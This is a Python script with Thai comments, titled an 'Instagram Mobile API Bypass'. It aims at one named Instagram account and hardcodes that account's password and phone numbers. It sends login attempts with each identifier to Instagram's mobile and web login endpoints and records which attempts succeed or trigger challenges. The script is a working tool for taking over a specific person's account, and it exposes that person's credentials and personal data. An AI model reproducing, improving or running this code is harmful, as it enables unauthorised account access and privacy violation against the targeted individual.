#!/usr/bin/env python3
"""
Instagram Mobile API Bypass - Fixed Version
แก้ไข BrokenPipeError และปรับปรุงการ handle errors

Target: alx.trading
Password: Fleming654  
Phone: 0615414210 (TH), +447793127209 (UK)
"""

import requests
import json
import time
import random
import sys
from datetime import datetime

def safe_print(message):
    """Print function ที่ปลอดภัยจาก BrokenPipeError"""
    try:
        print(message)
        sys.stdout.flush()
    except (BrokenPipeError, IOError):
        # Silently ignore pipe errors
        pass

class FixedInstagramMobileBypass:
    def __init__(self):
        self.session = requests.Session()
        
        # ข้อมูลเป้าหมาย
        self.username = 'alx.trading'
        self.password = 'Fleming654'
        self.phones = ['0615414210', '+447793127209', '615414210', '447793127209']
        
        safe_print("🚀 Instagram Mobile Bypass - Fixed Version")
        safe_print(f"🎯 Target: {self.username}")
        safe_print("=" * 50)
    
    def test_mobile_login(self, identifier):
        """ทดสอบ mobile login แบบง่าย"""
        safe_print(f"\n📱 Testing mobile login: {identifier}")
        
        url = "https://i.instagram.com/api/v1/accounts/login/"
        
        headers = {
            'User-Agent': 'Instagram 275.0.0.27.98 Android (25/7.1.1; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US)',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Language': 'en-US',
            'Accept-Encoding': 'gzip, deflate',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTv10=',
        }
        
        data = {
            'username': identifier,
            'password': self.password,
            'device_id': 'android-1234567890abcdef',
            'login_attempt_count': '0'
        }
        
        try:
            response = self.session.post(url, data=data, headers=headers, timeout=30)
            
            safe_print(f"📊 Status: {response.status_code}")
            safe_print(f"📊 Length: {len(response.text)}")
            
            # ลองแปลง JSON
            try:
                json_data = response.json()
                safe_print(f"📄 Response: {json_data}")
                
                # ตรวจสอบผลลัพธ์
                if json_data.get('status') == 'ok':
                    if json_data.get('logged_in_user'):
                        safe_print("🎉 LOGIN SUCCESS!")
                        return {'status': 'success', 'data': json_data}
                    elif 'challenge' in json_data:
                        safe_print("🔍 CHALLENGE REQUIRED!")
                        return {'status': 'challenge', 'data': json_data}
                
                return {'status': 'failed', 'data': json_data}
                
            except json.JSONDecodeError:
                safe_print("⚠️ Non-JSON response")
                safe_print(f"📄 Text: {response.text[:200]}...")
                return {'status': 'non_json', 'text': response.text}
                
        except requests.exceptions.RequestException as e:
            safe_print(f"❌ Request error: {str(e)[:100]}")
            return {'status': 'error', 'error': str(e)}
        except Exception as e:
            safe_print(f"❌ General error: {str(e)[:100]}")
            return {'status': 'error', 'error': str(e)}
    
    def test_web_login(self, identifier):
        """ทดสอบ web login แบบง่าย"""
        safe_print(f"\n🌐 Testing web login: {identifier}")
        
        url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
        data = {
            'username': identifier,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        try:
            response = self.session.post(url, data=data, headers=headers, timeout=30)
            
            safe_print(f"📊 Status: {response.status_code}")
            safe_print(f"📊 Length: {len(response.text)}")
            
            try:
                json_data = response.json()
                safe_print(f"📄 Response: {json_data}")
                return {'status': 'success', 'data': json_data}
            except json.JSONDecodeError:
                safe_print("⚠️ Non-JSON response")
                return {'status': 'non_json', 'text': response.text}
                
        except Exception as e:
            safe_print(f"❌ Web login error: {str(e)[:100]}")
            return {'status': 'error', 'error': str(e)}
    
    def run_comprehensive_test(self):
        """รันการทดสอบแบบครบถ้วน"""
        safe_print("\n🎯 Starting Comprehensive Bypass Test")
        safe_print("=" * 50)
        
        results = []
        
        # ทดสอบทั้ง username และ phone numbers
        identifiers = [self.username] + self.phones
        
        for i, identifier in enumerate(identifiers, 1):
            safe_print(f"\n📋 Test {i}/{len(identifiers)}: {identifier}")
            safe_print("-" * 30)
            
            # ทดสอบ mobile API
            mobile_result = self.test_mobile_login(identifier)
            
            # ทดสอบ web API
            web_result = self.test_web_login(identifier)
            
            result = {
                'identifier': identifier,
                'mobile_result': mobile_result,
                'web_result': web_result,
                'timestamp': datetime.now().isoformat()
            }
            
            results.append(result)
            
            # หน่วงเวลา
            if i < len(identifiers):
                safe_print("⏱️ Waiting 3 seconds...")
                time.sleep(3)
        
        # บันทึกผลลัพธ์
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"fixed_bypass_results_{timestamp}.json"
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            safe_print(f"\n💾 Results saved to: {filename}")
        except Exception as e:
            safe_print(f"❌ Save error: {str(e)}")
        
        # สรุปผลลัพธ์
        safe_print(f"\n📊 SUMMARY")
        safe_print("=" * 50)
        safe_print(f"🎯 Total tests: {len(results)}")
        
        success_count = 0
        challenge_count = 0
        
        for result in results:
            if result['mobile_result'].get('status') == 'success' or result['web_result'].get('status') == 'success':
                success_count += 1
            elif result['mobile_result'].get('status') == 'challenge':
                challenge_count += 1
        
        safe_print(f"✅ Successful logins: {success_count}")
        safe_print(f"🔍 Challenges detected: {challenge_count}")
        safe_print(f"📊 Success rate: {(success_count/len(results)*100):.1f}%")
        
        return results

def main():
    """Main function with error handling"""
    try:
        bypass = FixedInstagramMobileBypass()
        results = bypass.run_comprehensive_test()
        safe_print("\n✅ Test completed successfully!")
        return results
    except KeyboardInterrupt:
        safe_print("\n⚠️ Test interrupted by user")
        return None
    except Exception as e:
        safe_print(f"\n❌ Fatal error: {str(e)}")
        return None

if __name__ == "__main__":
    main()
